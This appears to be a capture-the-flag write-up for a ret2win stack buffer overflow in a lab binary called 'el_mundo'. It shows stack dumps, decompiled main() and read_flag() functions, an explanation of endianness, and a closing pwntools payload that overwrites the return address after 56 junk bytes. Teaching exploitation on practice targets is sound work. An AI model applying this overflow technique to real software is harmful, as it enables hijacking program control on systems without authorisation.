  ‚£ø‚£ø‚£ø‚£ø‚†ü‚£æ‚†ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚£ø‚£ø‚†Ä‚£∞‚†è‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†∞‚£æ‚£ø‚°ü‚†Ä‚†Ä‚¢∞‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚°ø‚£§‚£Ä‚£Ä‚£†‚£æ
  ‚£ø‚£ø‚£ø‚†ü‚£æ‚£ø‚†Ä‚†π‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚£ø‚£ø‚£ø‚°ü‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚°ø‚†Å‚†Ä‚†Ä‚°¥‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ß‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚†Ä‚£ø‚£ø‚£ø‚£ø‚£Ø
  ‚£ø‚£ø‚£ø‚¢∞‚£ø‚£ø‚£∑‚°Ä‚†±‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†∏‚£ø‚£ø‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°º‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚£∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ñ‚†Ä‚†Ä‚¢π‚£ø‚°Ñ‚£ø‚£ø‚£ø‚¢ø‚£ø
  ‚£ø‚£ø‚†ã‚£º‚£ø‚¢ø‚°Ä‚¢≥‚°Ñ‚†π‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£ø‚†è‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚°û‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∞‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚¢∑‚°Ñ‚†Ä‚†à‚£ø‚£ø‚£æ‚£ø‚°á‚†Ä‚†à
  ‚£ø‚†è‚£º‚£ø‚°è‚†Ä‚£∑‚°Ä‚†π‚°Ñ‚†ò‚£¶‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°¥‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ü‚†Ä‚¢±‚°Ñ‚†Ä‚†à‚†ª‚£ø‚£ø‚£ø‚°Ä‚†Ä
  ‚°è‚¢∏‚£ø‚£ø‚°á‚†Ä‚†à‚£á‚†Ä‚†ë‚†Ñ‚†à‚¢ø‚£ì‚†¶‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£∏‚£ø‚†è‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£†‚°û‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£†‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚¢∏‚£ø‚£¶‚£Ä‚°Ä‚†ô‚£ø‚£ø‚£á‚°Ä

Stack frame layout 

|      .      | <- Higher addresses
|      .      |
|_____________|
|             | <- 64 bytes
| Return addr |
|_____________|
|             | <- 56 bytes
|     RBP     |
|_____________|
|             | <- 48 bytes
| Local vars  |
|_____________|
|             | <- 32 bytes
|  Buffer[31] |
|_____________|
|      .      |
|      .      |
|_____________|
|             |
|  Buffer[0]  |
|_____________| <- Lower addresses


      [Addr]       |      [Value]
-------------------+-------------------

0x00007ffeb0ee4520 | 0x0000000000000000 <- Start of buffer (You write here from right to left)
0x00007ffeb0ee4528 | 0x0000000000000000
0x00007ffeb0ee4530 | 0x0000000000000000
0x00007ffeb0ee4538 | 0x0000000000000000
0x00007ffeb0ee4540 | 0x00007b6fa6204644 <- Local Variables
0x00007ffeb0ee4548 | 0x00000000deadbeef <- Local Variables (nbytes read receives)
0x00007ffeb0ee4550 | 0x00007ffeb0ee45f0 <- Saved rbp
0x00007ffeb0ee4558 | 0x00007b6fa602a1ca <- Saved return address
0x00007ffeb0ee4560 | 0x00007b6fa62045c0
0x00007ffeb0ee4568 | 0x00007ffeb0ee4678

[*] Overflow  the buffer.
[*] Overwrite the 'Local Variables' with junk.
[*] Overwrite the Saved RBP with junk.
[*] Overwrite 'Return Address' with the address of 'read_flag() [0x4016b7].'

> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa


      [Addr]       |      [Value]
-------------------+-------------------

0x00007ffeb0ee4520 | 0x6161616161616161 <- Start of buffer (You write here from right to left)
0x00007ffeb0ee4528 | 0x6161616161616161
0x00007ffeb0ee4530 | 0x6161616161616161
0x00007ffeb0ee4538 | 0x6161616161616161
0x00007ffeb0ee4540 | 0x6161616161616161 <- Local Variables
0x00007ffeb0ee4548 | 0x0000000000000086 <- Local Variables (nbytes read receives)
0x00007ffeb0ee4550 | 0x6161616161616161 <- Saved rbp
0x00007ffeb0ee4558 | 0x6161616161616161 <- Saved return address
0x00007ffeb0ee4560 | 0x6161616161616161
0x00007ffeb0ee4568 | 0x6161616161616161

[!] You changed the return address!


      [Addr]       |      [Value]
-------------------+-------------------

0x00007ffeb0ee4520 | 0x6161616161616161 <- Start of buffer (You write here from right to left)
0x00007ffeb0ee4528 | 0x6161616161616161
0x00007ffeb0ee4530 | 0x6161616161616161
0x00007ffeb0ee4538 | 0x6161616161616161
0x00007ffeb0ee4540 | 0x6161616161616161 <- Local Variables
0x00007ffeb0ee4548 | 0x0000000000000086 <- Local Variables (nbytes read receives)
0x00007ffeb0ee4550 | 0x6161616161616161 <- Saved rbp
0x00007ffeb0ee4558 | 0x6161616161616161 <- Saved return address
0x00007ffeb0ee4560 | 0x6161616161616161
0x00007ffeb0ee4568 | 0x6161616161616161

[1]    17576 segmentation fault (core dumped)  ./el_mundo
```

As we noticed before, there is indeed a `Buffer Overflow`, because after we entered a big amount of "a"s, the program stopped with `Segmentation fault`. This means we messed up with the addresses of the binary.

### Disassembly

Starting with `main()`:

```c
0040179f  int32_t main(int32_t argc, char** argv, char** envp)

0040179f  {
004017b0      int64_t dummy = 0xdeadbeef;
004017b4      int64_t buffer;
004017b4      __builtin_memset(&buffer, 0, 0x20);
004017d9      show_buffer();
004017e5      show_stack(&buffer);
00401803      printf("[*] Overflow  the buffer.\n[*] O‚Ä¶", read_flag);
00401819      ssize_t nbytes = read(0, &buffer, 0x100);
00401819      
00401827      if (nbytes > 0x37)
00401827      {
0040186d          show_stack(&buffer);
0040188b          printf("[!] You changed the return addre‚Ä¶", "\x1b[1;36m");
00401827      }
00401827      else
00401827      {
00401830          show_stack(&buffer);
0040185f          printf("%s[-] You need to add more than ‚Ä¶", "\x1b[1;31m", nbytes, "\x1b[1;36m");
00401827      }
00401827      
00401897      show_stack(&buffer);
004018a2      return 0;
0040179f  }
```

As we can see, the `buffer` is `0x20` bytes long and the `read` function reads up to `0x100` bytes, meaning we can overflow the buffer.

```c
004017b4      int64_t buffer;
004017b4      __builtin_memset(&buffer, 0, 0x20);
004017d9      show_buffer();
004017e5      show_stack(&buffer);
00401803      printf("[*] Overflow  the buffer.\n[*] O‚Ä¶", read_flag);
00401819      ssize_t nbytes = read(0, &buffer, 0x100);
```

But, what can we do after we overflow the buffer? We need to overwrite `return address` with something useful.

```c
004016b7  void read_flag() __noreturn

004016b7  {
004016cd      puts(&data_404618);
004016e6      int32_t fd = open("./flag.txt", 0);
004016f8      fflush(stdin);
00401707      fflush(__TMC_END__);
00401707      
00401710      if (fd < 0)
00401710      {
0040171c          perror("\nError opening flag.txt, please‚Ä¶");
00401726          exit(1);
00401726          /* no return */
00401710      }
00401710      
00401754      char buf;
00401754      
00401754      while (read(fd, &buf, 1) > 0)
0040173e          fputc(((int32_t)buf), __TMC_END__);
0040173e      
00401768      fflush(stdin);
00401777      fflush(__TMC_END__);
00401786      puts(&data_404602);
00401790      close(fd);
0040179a      exit(0x69);
0040179a      /* no return */
004016b7  }
```

This function prints the flag. This is our goal, we need to somehow call this function.

- Fill the `buffer[32]` buffer with 32 bytes of junk.
- Overwrite the `stack frame pointer` with 8 bytes of junk.
- Overwrite the `return address` with the address of `read_flag()`, 8 bytes aligned and correct endianness.

But, what exactly is [endianness](https://www.geeksforgeeks.org/little-and-big-endian-mystery/)?

It actually is the way of storing multibyte data types like `double`, `char`, `int` and so on.

- `Little endian`: **Last** byte of the multibyte data-type is stored first.
- `Big endian`: **First** byte of the multibyte data-type is stored first.

Once we find the address of `win()`, we have to convert it to this.

Inside the debugger, we can just `p` or `print` the address of function like this:

```gdb
pwndbg> p read_flag
$1 = {<text variable, no debug info>} 0x4016b7 <read_flag>
```

Well, the address is also given in the binary's interface, this is just another way to do it.

Our final payload, now that we have the address of `read_flag()`, should look like this:

```bash
r.sendlineafter('> ', b'A'*56 + p64(e.sym.read_flag))
```

